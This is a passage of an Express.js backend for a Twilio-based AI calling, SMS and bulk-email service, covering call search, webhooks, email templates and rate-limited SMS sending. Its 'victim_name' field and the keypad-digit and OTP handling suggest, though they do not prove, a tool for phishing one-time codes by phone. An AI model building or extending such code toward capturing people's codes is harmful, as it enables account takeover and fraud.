// Get call details with enhanced personality and function analytics
app.get("/api/calls/:callSid", async (req, res) => {
  try {
    const { callSid } = req.params;

    const call = await db.getCall(callSid);
    if (!call) {
      return res.status(404).json({ error: "Call not found" });
    }
    let callState = null;
    try {
      callState = await db.getLatestCallState(callSid, "call_created");
    } catch (_) {
      callState = null;
    }
    const enrichedCall =
      callState?.customer_name || callState?.victim_name
        ? {
            ...call,
            customer_name: callState?.customer_name || callState?.victim_name,
          }
        : call;
    const normalizedCall = normalizeCallRecordForApi(enrichedCall);

    const transcripts = await db.getCallTranscripts(callSid);

    // Parse adaptation data
    let adaptationData = {};
    try {
      if (call.ai_analysis) {
        const analysis = JSON.parse(call.ai_analysis);
        adaptationData = analysis.adaptation || {};
      }
    } catch (e) {
      console.error("Error parsing adaptation data:", e);
    }

    // Get webhook notifications for this call
    const webhookNotifications = await new Promise((resolve, reject) => {
      db.db.all(
        `SELECT * FROM webhook_notifications WHERE call_sid = ? ORDER BY created_at DESC`,
        [callSid],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows || []);
        },
      );
    });

    res.json({
      call: normalizedCall,
      transcripts,
      transcript_count: transcripts.length,
      adaptation_analytics: adaptationData,
      business_context: call.business_context
        ? JSON.parse(call.business_context)
        : null,
      webhook_notifications: webhookNotifications,
      enhanced_features: true,
    });
  } catch (error) {
    console.error("Error fetching enhanced adaptive call details:", error);
    res.status(500).json({ error: "Failed to fetch call details" });
  }
});

// Enhanced call status endpoint with real-time metrics
app.get("/api/calls/:callSid/status", async (req, res) => {
  try {
    const { callSid } = req.params;

    const call = await db.getCall(callSid);
    if (!call) {
      return res.status(404).json({ error: "Call not found" });
    }

    // Get recent call states for detailed progress tracking
    const recentStates = await db.getCallStates(callSid, { limit: 15 });

    // Get enhanced webhook notification status
    const notificationStatus = await new Promise((resolve, reject) => {
      db.db.all(
        `SELECT notification_type, status, created_at, sent_at, delivery_time_ms, error_message 
         FROM webhook_notifications 
         WHERE call_sid = ? 
         ORDER BY created_at DESC`,
        [callSid],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows || []);
        },
      );
    });

    // Calculate enhanced call timing metrics
    let timingMetrics = {};
    if (call.created_at) {
      const now = new Date();
      const created = new Date(call.created_at);
      timingMetrics.total_elapsed = Math.round((now - created) / 1000);

      if (call.started_at) {
        const started = new Date(call.started_at);
        timingMetrics.time_to_answer = Math.round((started - created) / 1000);
      }

      if (call.ended_at) {
        const ended = new Date(call.ended_at);
        timingMetrics.call_duration =
          call.duration ||
          Math.round(
            (ended - new Date(call.started_at || call.created_at)) / 1000,
          );
      }

      // Calculate ring duration if available
      if (call.ring_duration) {
        timingMetrics.ring_duration = call.ring_duration;
      }
    }

    res.json({
      call: {
        ...call,
        timing_metrics: timingMetrics,
      },
      recent_states: recentStates,
      notification_status: notificationStatus,
      webhook_service_status: webhookService.getCallStatusStats(),
      enhanced_tracking: true,
    });
  } catch (error) {
    console.error("Error fetching enhanced call status:", error);
    res.status(500).json({ error: "Failed to fetch call status" });
  }
});

// Call latency diagnostics endpoint (best-effort)
// Manual notification trigger endpoint (for testing)
// Get enhanced adaptation analytics dashboard data
// Enhanced health endpoint with comprehensive system status
app.get("/health", async (req, res) => {
  try {
    const hmacSecret = config.apiAuth?.hmacSecret;
    const hmacOk = hmacSecret ? verifyHmacSignature(req).ok : false;
    const adminOk = hasAdminToken(req);
    if (!hmacOk && !adminOk) {
      return res.json({
        status: "healthy",
        timestamp: new Date().toISOString(),
        public: true,
      });
    }

    const calls = await db.getCallsWithTranscripts(1);
    const webhookHealth = await webhookService.healthCheck();
    const callStats = webhookService.getCallStatusStats();
    const notificationMetrics = await db.getNotificationAnalytics(1);
    await refreshInboundDefaultScript();
    const inboundDefaultSummary = inboundDefaultScript
      ? {
          mode: "script",
          script_id: inboundDefaultScriptId,
          name: inboundDefaultScript.name,
        }
      : { mode: "builtin" };
    const inboundEnvSummary = {
      prompt: Boolean(config.inbound?.defaultPrompt),
      first_message: Boolean(config.inbound?.defaultFirstMessage),
    };
    const providerHealthSummary = SUPPORTED_PROVIDERS.reduce(
      (acc, provider) => {
        const health = providerHealth.get(provider) || {};
        acc[provider] = {
          configured: Boolean(getProviderReadiness()[provider]),
          degraded: isProviderDegraded(provider),
          last_error_at: health.lastErrorAt || null,
          last_success_at: health.lastSuccessAt || null,
        };
        return acc;
      },
      {},
    );
    pruneExpiredKeypadProviderOverrides();
    const keypadOverrideSummary = [...keypadProviderOverrides.entries()].map(
      ([scopeKey, override]) => ({
        scope_key: scopeKey,
        provider: override?.provider || null,
        expires_at: override?.expiresAt
          ? new Date(override.expiresAt).toISOString()
          : null,
      }),
    );

    // Check service health logs
    const recentHealthLogs = await new Promise((resolve, reject) => {
      db.db.all(
        `
        SELECT service_name, status, COUNT(*) as count
        FROM service_health_logs 
        WHERE timestamp >= datetime('now', '-1 hour')
        GROUP BY service_name, status
        ORDER BY service_name
      `,
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows || []);
        },
      );
    });

    res.json({
      status: "healthy",
      timestamp: new Date().toISOString(),
      enhanced_features: true,
      services: {
        database: {
          connected: true,
          recent_calls: calls.length,
        },
        webhook_service: webhookHealth,
        call_tracking: callStats,
        notification_system: {
          total_today: notificationMetrics.total_notifications,
          success_rate: notificationMetrics.overall_success_rate + "%",
          avg_delivery_time:
            notificationMetrics.breakdown.length > 0
              ? notificationMetrics.breakdown[0].avg_delivery_time + "ms"
              : "N/A",
        },
        provider_failover: providerHealthSummary,
        keypad_guard: {
          enabled: config.keypadGuard?.enabled === true,
          active_overrides: keypadOverrideSummary.length,
          overrides: keypadOverrideSummary,
        },
        voice_agent: {
          enabled: Boolean(config.deepgram?.voiceAgent?.enabled),
          endpoint: config.deepgram?.voiceAgent?.endpoint || null,
        },
      },
      active_calls: callConfigurations.size,
      adaptation_engine: {
        available_scripts: functionEngine
          ? functionEngine.getBusinessAnalysis().availableTemplates.length
          : 0,
        active_function_systems: callFunctionSystems.size,
      },
      inbound_defaults: inboundDefaultSummary,
      inbound_env_defaults: inboundEnvSummary,
      system_health: recentHealthLogs,
    });
  } catch (error) {
    console.error("Enhanced health check error:", error);
    res.status(500).json({
      status: "unhealthy",
      timestamp: new Date().toISOString(),
      enhanced_features: true,
      error: error.message,
      services: {
        database: {
          connected: false,
          error: error.message,
        },
        webhook_service: {
          status: "error",
          reason: "Database connection failed",
        },
      },
    });
  }
});

// Enhanced system maintenance endpoint
// Basic calls list endpoint
app.get("/api/calls", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 10, 50); // Max 50 calls
    const offset = parseInt(req.query.offset) || 0;

    console.log(`Fetching calls list: limit=${limit}, offset=${offset}`);

    // Get calls from database using the new method
    const calls = await db.getRecentCalls(limit, offset);
    const totalCount = await db.getCallsCount();

    // Format the response with enhanced data
    const formattedCalls = calls.map((call) => {
      const normalized = normalizeCallRecordForApi(call);
      return {
        ...normalized,
        transcript_count: call.transcript_count || 0,
        created_date: new Date(call.created_at).toLocaleDateString(),
        duration_formatted: call.duration
          ? `${Math.floor(call.duration / 60)}:${String(call.duration % 60).padStart(2, "0")}`
          : "N/A",
        // Parse JSON fields safely
        business_context: call.business_context
          ? (() => {
              try {
                return JSON.parse(call.business_context);
              } catch {
                return null;
              }
            })()
          : null,
        generated_functions: call.generated_functions
          ? (() => {
              try {
                return JSON.parse(call.generated_functions);
              } catch {
                return [];
              }
            })()
          : [],
      };
    });

    res.json({
      success: true,
      calls: formattedCalls,
      pagination: {
        total: totalCount,
        limit: limit,
        offset: offset,
        has_more: offset + limit < totalCount,
      },
      enhanced_features: true,
    });
  } catch (error) {
    console.error("Error fetching calls list:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch calls list",
      details: error.message,
    });
  }
});

// Enhanced calls list endpoint with filters
app.get("/api/calls/list", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 10, 50);
    const offset = parseInt(req.query.offset) || 0;
    const status = req.query.status; // Filter by status
    const phone = req.query.phone; // Filter by phone number
    const dateFrom = req.query.date_from; // Filter by date range
    const dateTo = req.query.date_to;

    let whereClause = "";
    let queryParams = [];

    // Build dynamic where clause
    const conditions = [];

    if (status) {
      conditions.push("c.status = ?");
      queryParams.push(status);
    }

    if (phone) {
      conditions.push("c.phone_number LIKE ?");
      queryParams.push(`%${phone}%`);
    }

    if (dateFrom) {
      conditions.push("c.created_at >= ?");
      queryParams.push(dateFrom);
    }

    if (dateTo) {
      conditions.push("c.created_at <= ?");
      queryParams.push(dateTo);
    }

    if (conditions.length > 0) {
      whereClause = "WHERE " + conditions.join(" AND ");
    }

    const query = `
      SELECT 
        c.*,
        COUNT(t.id) as transcript_count,
        GROUP_CONCAT(DISTINCT t.speaker) as speakers,
        MIN(t.timestamp) as conversation_start,
        MAX(t.timestamp) as conversation_end
      FROM calls c
      LEFT JOIN transcripts t ON c.call_sid = t.call_sid
      ${whereClause}
      GROUP BY c.call_sid
      ORDER BY c.created_at DESC
      LIMIT ? OFFSET ?
    `;

    queryParams.push(limit, offset);

    const calls = await new Promise((resolve, reject) => {
      db.db.all(query, queryParams, (err, rows) => {
        if (err) {
          console.error("Database error in enhanced calls query:", err);
          reject(err);
        } else {
          resolve(rows || []);
        }
      });
    });

    // Get filtered count
    const countQuery = `SELECT COUNT(*) as count FROM calls c ${whereClause}`;
    const totalCount = await new Promise((resolve, reject) => {
      db.db.get(countQuery, queryParams.slice(0, -2), (err, row) => {
        if (err) {
          console.error("Database error counting filtered calls:", err);
          resolve(0);
        } else {
          resolve(row?.count || 0);
        }
      });
    });

    // Enhanced formatting
    const enhancedCalls = calls.map((call) => {
      const hasConversation =
        call.speakers &&
        call.speakers.includes("user") &&
        call.speakers.includes("ai");
      const conversationDuration =
        call.conversation_start && call.conversation_end
          ? Math.round(
              (new Date(call.conversation_end) -
                new Date(call.conversation_start)) /
                1000,
            )
          : 0;

      return {
        call_sid: call.call_sid,
        phone_number: call.phone_number,
        status: call.status,
        twilio_status: call.twilio_status,
        created_at: call.created_at,
        started_at: call.started_at,
        ended_at: call.ended_at,
        duration: call.duration,
        transcript_count: call.transcript_count || 0,
        has_conversation: hasConversation,
        conversation_duration: conversationDuration,
        call_summary: call.call_summary,
        user_chat_id: call.user_chat_id,
        // Enhanced metadata
        business_context: call.business_context
          ? (() => {
              try {
                return JSON.parse(call.business_context);
              } catch {
                return null;
              }
            })()
          : null,
        generated_functions_count: call.generated_functions
          ? (() => {
              try {
                return JSON.parse(call.generated_functions).length;
              } catch {
                return 0;
              }
            })()
          : 0,
        // Formatted fields
        created_date: new Date(call.created_at).toLocaleDateString(),
        created_time: new Date(call.created_at).toLocaleTimeString(),
        duration_formatted: call.duration
          ? `${Math.floor(call.duration / 60)}:${String(call.duration % 60).padStart(2, "0")}`
          : "N/A",
        status_icon: getStatusIcon(call.status),
        enhanced: true,
      };
    });

    res.json({
      success: true,
      calls: enhancedCalls,
      filters: {
        status,
        phone,
        date_from: dateFrom,
        date_to: dateTo,
      },
      pagination: {
        total: totalCount,
        limit: limit,
        offset: offset,
        has_more: offset + limit < totalCount,
        current_page: Math.floor(offset / limit) + 1,
        total_pages: Math.ceil(totalCount / limit),
      },
      enhanced_features: true,
    });
  } catch (error) {
    console.error("Error in enhanced calls list:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch enhanced calls list",
      details: error.message,
    });
  }
});

// Helper function for status icons
function getStatusIcon(status) {
  const icons = {
    completed: "✅",
    "no-answer": "📶",
    busy: "📞",
    failed: "❌",
    canceled: "🎫",
    "in-progress": "🔄",
    ringing: "📲",
  };
  return icons[status] || "❓";
}

function normalizeCallRecordForApi(call) {
  if (!call || typeof call !== "object") return call;
  const normalized = { ...call };
  return normalized;
}

// Add calls analytics endpoint
// Search calls endpoint
app.get("/api/calls/search", async (req, res) => {
  try {
    const query = req.query.q;
    const limit = Math.min(parseInt(req.query.limit) || 20, 50);

    if (!query || query.length < 2) {
      return res.status(400).json({
        success: false,
        error: "Search query must be at least 2 characters",
      });
    }

    // Search in calls and transcripts
    const searchResults = await new Promise((resolve, reject) => {
      const searchQuery = `
        SELECT DISTINCT
          c.*,
          COUNT(t.id) as transcript_count,
          GROUP_CONCAT(t.message, ' ') as conversation_text
        FROM calls c
        LEFT JOIN transcripts t ON c.call_sid = t.call_sid
        WHERE 
          c.phone_number LIKE ? OR
          c.call_summary LIKE ? OR
          c.prompt LIKE ? OR
          c.first_message LIKE ? OR
          t.message LIKE ?
        GROUP BY c.call_sid
        ORDER BY c.created_at DESC
        LIMIT ?
      `;

      const searchTerm = `%${query}%`;
      const params = [
        searchTerm,
        searchTerm,
        searchTerm,
        searchTerm,
        searchTerm,
        limit,
      ];

      db.db.all(searchQuery, params, (err, rows) => {
        if (err) {
          console.error("Search query error:", err);
          reject(err);
        } else {
          resolve(rows || []);
        }
      });
    });

    const formattedResults = searchResults.map((call) => ({
      call_sid: call.call_sid,
      phone_number: call.phone_number,
      status: call.status,
      created_at: call.created_at,
      duration: call.duration,
      transcript_count: call.transcript_count || 0,
      call_summary: call.call_summary,
      // Highlight matching text (basic implementation)
      matching_text: call.conversation_text
        ? `${digitService ? digitService.maskOtpForExternal(call.conversation_text) : call.conversation_text}`.substring(
            0,
            200,
          ) + "..."
        : null,
      created_date: new Date(call.created_at).toLocaleDateString(),
      duration_formatted: call.duration
        ? `${Math.floor(call.duration / 60)}:${String(call.duration % 60).padStart(2, "0")}`
        : "N/A",
    }));

    res.json({
      success: true,
      query: query,
      results: formattedResults,
      result_count: formattedResults.length,
      enhanced_search: true,
    });
  } catch (error) {
    console.error("Error in call search:", error);
    res.status(500).json({
      success: false,
      error: "Search failed",
      details: error.message,
    });
  }
});

// SMS webhook endpoints
app.post("/webhook/sms", async (req, res) => {
  try {
    if (!requireValidTwilioSignature(req, res, "/webhook/sms")) {
      return;
    }
    const { From, Body, MessageSid, SmsStatus } = req.body;

    console.log("sms_webhook_received", {
      request_id: req.requestId || null,
      from: maskPhoneForLog(From),
      body: maskSmsBodyForLog(Body),
      message_sid: MessageSid || null,
    });

    if (digitService?.handleIncomingSms) {
      const handled = await digitService.handleIncomingSms(From, Body);
      if (handled?.handled) {
        res.status(200).send("OK");
        return;
      }
    }

    // Handle incoming SMS with AI
    const result = await smsService.handleIncomingSMS(From, Body, MessageSid);

    // Save to database if needed
    if (db) {
      await db.saveSMSMessage({
        message_sid: MessageSid,
        from_number: From,
        body: Body,
        status: SmsStatus,
        direction: "inbound",
        ai_response: result.ai_response,
        response_message_sid: result.message_sid,
      });
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("SMS webhook error:", error);
    res.status(500).send("Error");
  }
});

app.post("/webhook/sms-status", async (req, res) => {
  try {
    if (!requireValidTwilioSignature(req, res, "/webhook/sms-status")) {
      return;
    }
    const { MessageSid, MessageStatus, ErrorCode, ErrorMessage } = req.body;

    console.log(`SMS status update: ${MessageSid} -> ${MessageStatus}`);

    if (db) {
      await db.updateSMSStatus(MessageSid, {
        status: MessageStatus,
        error_code: ErrorCode,
        error_message: ErrorMessage,
        updated_at: new Date(),
      });
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("SMS status webhook error:", error);
    res.status(500).send("OK"); // Return OK to prevent retries
  }
});

app.get("/webhook/twilio-tts", (req, res) => {
  const key = String(req.query?.key || "").trim();
  if (!key) {
    res.status(400).send("Missing key");
    return;
  }
  const entry = twilioTtsCache.get(key);
  if (!entry || entry.expiresAt <= Date.now()) {
    twilioTtsCache.delete(key);
    res.status(404).send("Not found");
    return;
  }
  res.set(
    "Cache-Control",
    `public, max-age=${Math.floor(TWILIO_TTS_CACHE_TTL_MS / 1000)}`,
  );
  res.type(entry.contentType || "audio/wav");
  res.send(entry.buffer);
});

// Email webhook endpoints
app.post("/webhook/email", async (req, res) => {
  try {
    if (!emailService) {
      return res
        .status(500)
        .json({ success: false, error: "Email service not initialized" });
    }
    const result = await emailService.handleProviderEvent(req.body || {});
    res.json({ success: true, ...result });
  } catch (error) {
    console.error("❌ Email webhook error:", error);
    res.status(500).json({
      success: false,
      error: "Email webhook processing failed",
      details: error.message,
    });
  }
});

app.get("/webhook/email-unsubscribe", async (req, res) => {
  try {
    const email = String(req.query?.email || "")
      .trim()
      .toLowerCase();
    const messageId = String(req.query?.message_id || "").trim();
    if (!email) {
      return res.status(400).send("Missing email");
    }
    await db.setEmailSuppression(email, "unsubscribe", "link");
    if (messageId) {
      await db.addEmailEvent(messageId, "complained", {
        reason: "unsubscribe",
      });
      await db.updateEmailMessageStatus(messageId, {
        status: "complained",
        failure_reason: "unsubscribe",
        failed_at: new Date().toISOString(),
      });
    }
    res.send("Unsubscribed");
  } catch (error) {
    console.error("❌ Email unsubscribe error:", error);
    res.status(500).send("Unsubscribe failed");
  }
});

const twilioGatherHandler = createTwilioGatherHandler({
  warnOnInvalidTwilioSignature,
  requireTwilioSignature: requireValidTwilioSignature,
  getDigitService: () => digitService,
  callConfigurations,
  config,
  VoiceResponse,
  webhookService,
  resolveHost,
  buildTwilioStreamTwiml,
  clearPendingDigitReprompts,
  callEndLocks,
  gatherEventDedupe,
  maskDigitsForLog,
  callEndMessages: CALL_END_MESSAGES,
  closingMessage: CLOSING_MESSAGE,
  queuePendingDigitAction,
  getTwilioTtsAudioUrl,
  ttsTimeoutMs: Number(config.twilio?.ttsMaxWaitMs) || 1200,
  shouldUseTwilioPlay,
  resolveTwilioSayVoice,
  isGroupedGatherPlan,
});

// Twilio Gather fallback handler (DTMF)
app.post("/webhook/twilio-gather", twilioGatherHandler);

// Email API endpoints
app.post("/email/send", requireOutboundAuthorization, async (req, res) => {
  try {
    if (!emailService) {
      return sendApiError(
        res,
        500,
        "email_service_unavailable",
        "Email service not initialized",
        req.requestId,
      );
    }
    const limitResponse = await enforceOutboundRateLimits(req, res, {
      namespace: "email_send",
      actorKey: getOutboundActorKey(req),
      perUserLimit: Number(config.outboundLimits?.email?.perUser) || 20,
      globalLimit: Number(config.outboundLimits?.email?.global) || 120,
      windowMs: Number(config.outboundLimits?.windowMs) || 60000,
    });
    if (limitResponse) {
      return;
    }
    const emailPayload = { ...(req.body || {}) };
    if (!emailPayload.provider) {
      emailPayload.provider = getActiveEmailProvider();
    }
    const idempotencyKey =
      req.headers["idempotency-key"] || req.headers["Idempotency-Key"];
    console.log("email_send_request", {
      request_id: req.requestId || null,
      to: redactSensitiveLogValue(req.body?.to || ""),
      from: redactSensitiveLogValue(req.body?.from || ""),
      actor: getOutboundActorKey(req),
      provider: String(emailPayload.provider || "unknown").toLowerCase(),
      idempotency_key: idempotencyKey ? "present" : "absent",
    });
    const result = await runWithTimeout(
      emailService.enqueueEmail(emailPayload, {
        idempotencyKey,
      }),
      Number(config.outboundLimits?.handlerTimeoutMs) || 30000,
      "email send handler",
      "email_handler_timeout",
    );
    res.json({
      success: true,
      message_id: result.message_id,
      deduped: result.deduped || false,
      suppressed: result.suppressed || false,
      request_id: req.requestId || null,
    });
  } catch (error) {
    const status =
      error.code === "idempotency_conflict"
        ? 409
        : error.code === "email_handler_timeout"
          ? 504
          : error.code === "missing_variables" || error.code === "validation_error"
            ? 400
            : 500;
    console.error("email_send_error", {
      request_id: req.requestId || null,
      actor: getOutboundActorKey(req),
      error: redactSensitiveLogValue(error.message || "email_send_failed"),
      code: error.code || null,
    });
    sendApiError(
      res,
      status,
      error.code || "email_send_failed",
      error.message || "Email send failed",
      req.requestId,
      { missing: error.missing },
    );
  }
});

app.post("/email/bulk", requireOutboundAuthorization, async (req, res) => {
  try {
    if (!emailService) {
      return sendApiError(
        res,
        500,
        "email_service_unavailable",
        "Email service not initialized",
        req.requestId,
      );
    }
    const limitResponse = await enforceOutboundRateLimits(req, res, {
      namespace: "email_bulk",
      actorKey: getOutboundActorKey(req),
      perUserLimit: Number(config.outboundLimits?.email?.perUser) || 20,
      globalLimit: Number(config.outboundLimits?.email?.global) || 120,
      windowMs: Number(config.outboundLimits?.windowMs) || 60000,
    });
    if (limitResponse) {
      return;
    }
    const bulkPayload = { ...(req.body || {}) };
    if (!bulkPayload.provider) {
      bulkPayload.provider = getActiveEmailProvider();
    }
    const idempotencyKey =
      req.headers["idempotency-key"] || req.headers["Idempotency-Key"];
    const recipientCount = Array.isArray(req.body?.recipients)
      ? req.body.recipients.length
      : 0;
    console.log("email_bulk_request", {
      request_id: req.requestId || null,
      actor: getOutboundActorKey(req),
      recipients: recipientCount,
      provider: String(bulkPayload.provider || "unknown").toLowerCase(),
      idempotency_key: idempotencyKey ? "present" : "absent",
    });
    const result = await runWithTimeout(
      emailService.enqueueBulk(bulkPayload, {
        idempotencyKey,
      }),
      Number(config.outboundLimits?.handlerTimeoutMs) || 30000,
      "email bulk handler",
      "email_handler_timeout",
    );
    res.json({
      success: true,
      bulk_job_id: result.bulk_job_id,
      deduped: result.deduped || false,
      request_id: req.requestId || null,
    });
  } catch (error) {
    const status =
      error.code === "idempotency_conflict"
        ? 409
        : error.code === "email_handler_timeout"
          ? 504
          : error.code === "validation_error"
            ? 400
            : 500;
    console.error("email_bulk_error", {
      request_id: req.requestId || null,
      actor: getOutboundActorKey(req),
      error: redactSensitiveLogValue(error.message || "email_bulk_failed"),
      code: error.code || null,
    });
    sendApiError(
      res,
      status,
      error.code || "email_bulk_failed",
      error.message || "Bulk email enqueue failed",
      req.requestId,
    );
  }
});

app.post("/email/preview", async (req, res) => {
  try {
    if (!emailService) {
      return res
        .status(500)
        .json({ success: false, error: "Email service not initialized" });
    }
    const result = await emailService.previewScript(req.body || {});
    res.json({ success: result.ok, ...result });
  } catch (error) {
    res.status(400).json({ success: false, error: error.message });
  }
});

function extractEmailTemplateVariables(text = "") {
  if (!text) return [];
  const matches = text.match(/{{\s*([\w.-]+)\s*}}/g) || [];
  const vars = new Set();
  matches.forEach((match) => {
    const cleaned = match.replace(/{{|}}/g, "").trim();
    if (cleaned) vars.add(cleaned);
  });
  return Array.from(vars);
}

function buildRequiredVars(subject, html, text) {
  const required = new Set();
  extractEmailTemplateVariables(subject).forEach((v) => required.add(v));
  extractEmailTemplateVariables(html).forEach((v) => required.add(v));
  extractEmailTemplateVariables(text).forEach((v) => required.add(v));
  return Array.from(required);
}

app.get("/email/templates", async (req, res) => {
  try {
    const limit = Number(req.query?.limit) || 50;
    const templates = await db.listEmailTemplates(limit);
    res.json({ success: true, templates });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/email/templates/:id", async (req, res) => {
  try {
    const templateId = req.params.id;
    const template = await db.getEmailTemplate(templateId);
    if (!template) {
      return res
        .status(404)
        .json({ success: false, error: "Template not found" });
    }
    res.json({ success: true, template });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post("/email/templates", async (req, res) => {
  try {
    const payload = req.body || {};
    const templateId = String(payload.template_id || "").trim();
    if (!templateId) {
      return res
        .status(400)
        .json({ success: false, error: "template_id is required" });
    }
    const subject = payload.subject || "";
    const html = payload.html || "";
    const text = payload.text || "";
    if (!subject) {
      return res
        .status(400)
        .json({ success: false, error: "subject is required" });
    }
    if (!html && !text) {
      return res
        .status(400)
        .json({ success: false, error: "html or text is required" });
    }
    const requiredVars = buildRequiredVars(subject, html, text);
    await db.createEmailTemplate({
      template_id: templateId,
      subject,
      html,
      text,
      required_vars: JSON.stringify(requiredVars),
    });
    const template = await db.getEmailTemplate(templateId);
    res.json({ success: true, template });
  } catch (error) {
    res.status(400).json({ success: false, error: error.message });
  }
});

app.put("/email/templates/:id", async (req, res) => {
  try {
    const templateId = req.params.id;
    const existing = await db.getEmailTemplate(templateId);
    if (!existing) {
      return res
        .status(404)
        .json({ success: false, error: "Template not found" });
    }
    const payload = req.body || {};
    const subject =
      payload.subject !== undefined ? payload.subject : existing.subject;
    const html = payload.html !== undefined ? payload.html : existing.html;
    const text = payload.text !== undefined ? payload.text : existing.text;
    const requiredVars = buildRequiredVars(
      subject || "",
      html || "",
      text || "",
    );
    await db.updateEmailTemplate(templateId, {
      subject: payload.subject,
      html: payload.html,
      text: payload.text,
      required_vars: JSON.stringify(requiredVars),
    });
    const template = await db.getEmailTemplate(templateId);
    res.json({ success: true, template });
  } catch (error) {
    res.status(400).json({ success: false, error: error.message });
  }
});

app.delete("/email/templates/:id", async (req, res) => {
  try {
    const templateId = req.params.id;
    await db.deleteEmailTemplate(templateId);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

function normalizeEmailMessageForApi(message) {
  if (!message || typeof message !== "object") return message;
  const normalized = { ...message };
  if ("template_id" in normalized) {
    normalized.script_id = normalized.template_id;
    delete normalized.template_id;
  }
  return normalized;
}

function normalizeEmailJobForApi(job) {
  if (!job || typeof job !== "object") return job;
  const normalized = { ...job };
  if ("template_id" in normalized) {
    normalized.script_id = normalized.template_id;
    delete normalized.template_id;
  }
  return normalized;
}

app.get("/email/messages/:id", async (req, res) => {
  try {
    const messageId = req.params.id;
    const message = await db.getEmailMessage(messageId);
    if (!message) {
      return res
        .status(404)
        .json({ success: false, error: "Message not found" });
    }
    const events = await db.listEmailEvents(messageId);
    res.json({
      success: true,
      message: normalizeEmailMessageForApi(message),
      events,
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/email/bulk/:jobId", async (req, res) => {
  try {
    const jobId = req.params.jobId;
    const job = await db.getEmailBulkJob(jobId);
    if (!job) {
      return res
        .status(404)
        .json({ success: false, error: "Bulk job not found" });
    }
    res.json({ success: true, job: normalizeEmailJobForApi(job) });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/email/bulk/history", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit, 10) || 10, 50);
    const offset = Math.max(parseInt(req.query.offset, 10) || 0, 0);
    const jobs = await db.getEmailBulkJobs({ limit, offset });
    res.json({
      success: true,
      jobs: jobs.map(normalizeEmailJobForApi),
      limit,
      offset,
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/email/bulk/stats", async (req, res) => {
  try {
    const hours = Math.min(
      Math.max(parseInt(req.query.hours, 10) || 24, 1),
      720,
    );
    const stats = await db.getEmailBulkStats({ hours });
    res.json({ success: true, stats, hours });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Send single SMS endpoint
app.post("/api/sms/send", requireOutboundAuthorization, async (req, res) => {
  try {
    const {
      to,
      message,
      from,
      user_chat_id,
      options = {},
      idempotency_key,
      allow_quiet_hours,
      quiet_hours,
      media_url,
      provider,
    } = req.body;
    const idempotencyHeader =
      req.headers["idempotency-key"] || req.headers["Idempotency-Key"];

    if (!to || !message) {
      return sendApiError(
        res,
        400,
        "sms_validation_failed",
        "Phone number and message are required",
        req.requestId,
      );
    }

    // Validate phone number format
    if (!to.match(/^\+[1-9]\d{1,14}$/)) {
      return sendApiError(
        res,
        400,
        "sms_validation_failed",
        "Invalid phone number format. Use E.164 format (e.g., +1234567890)",
        req.requestId,
      );
    }

    const maxSmsChars = Number(config.sms?.maxMessageChars) || 1600;
    if (String(message).length > maxSmsChars) {
      return sendApiError(
        res,
        400,
        "sms_validation_failed",
        `Message exceeds ${maxSmsChars} characters`,
        req.requestId,
      );
    }

    const limitResponse = await enforceOutboundRateLimits(req, res, {
      namespace: "sms_send",
      actorKey: getOutboundActorKey(req, user_chat_id),
      perUserLimit: Number(config.outboundLimits?.sms?.perUser) || 15,
      globalLimit: Number(config.outboundLimits?.sms?.global) || 120,
      windowMs: Number(config.outboundLimits?.windowMs) || 60000,
    });
    if (limitResponse) {
      return;
    }

    const smsOptions = { ...(options || {}) };
    if ((idempotency_key || idempotencyHeader) && !smsOptions.idempotencyKey) {
      smsOptions.idempotencyKey = idempotency_key || idempotencyHeader;
    }
    if (allow_quiet_hours === false) {
      smsOptions.allowQuietHours = false;
    }
    if (quiet_hours && !smsOptions.quietHours) {
      smsOptions.quietHours = quiet_hours;
    }
    if (media_url && !smsOptions.mediaUrl) {
      smsOptions.mediaUrl = media_url;
    }
    if (user_chat_id && !smsOptions.userChatId) {
      smsOptions.userChatId = String(user_chat_id);
    }
    if (provider && !smsOptions.provider) {
      smsOptions.provider = String(provider).trim().toLowerCase();
    }

    console.log("sms_send_request", {
      request_id: req.requestId || null,
      actor: getOutboundActorKey(req, user_chat_id),
      to: maskPhoneForLog(to),
      body: maskSmsBodyForLog(message),
      provider: smsOptions.provider || getActiveSmsProvider(),
      idempotency_key: smsOptions.idempotencyKey ? "present" : "absent",
    });

    const result = await runWithTimeout(
      smsService.sendSMS(to, message, from, smsOptions),
      Number(config.outboundLimits?.handlerTimeoutMs) || 30000,
      "sms send handler",
      "sms_handler_timeout",
    );

    // Save to database
    if (db && result.message_sid && result.idempotent !== true) {
      try {
        await db.saveSMSMessage({
          message_sid: result.message_sid,
          to_number: to,
          from_number: result.from,
          body: message,
          status: result.status,
          direction: "outbound",
          user_chat_id: user_chat_id,
        });
      } catch (saveError) {
        const saveMsg = String(saveError?.message || "");
        if (
          !saveMsg.includes("UNIQUE constraint failed") &&
          !saveMsg.includes("SQLITE_CONSTRAINT")
        ) {
          throw saveError;
        }
      }

      // Create webhook notification
      if (user_chat_id) {
        await db.createEnhancedWebhookNotification(
          result.message_sid,
          "sms_sent",
          user_chat_id,
        );
      }
    }

    res.json({
      success: true,
      ...result,
      request_id: req.requestId || null,
    });
  } catch (error) {
    const providerStatus = Number(
      error?.status || error?.statusCode || error?.response?.status,
    );
    const status =
      error.code === "idempotency_conflict"
        ? 409
        : error.code === "sms_validation_failed"
          ? 400
          : error.code === "sms_handler_timeout" ||
              error.code === "sms_provider_timeout" ||
              error.code === "sms_timeout"
            ? 504
            : providerStatus === 429
              ? 429
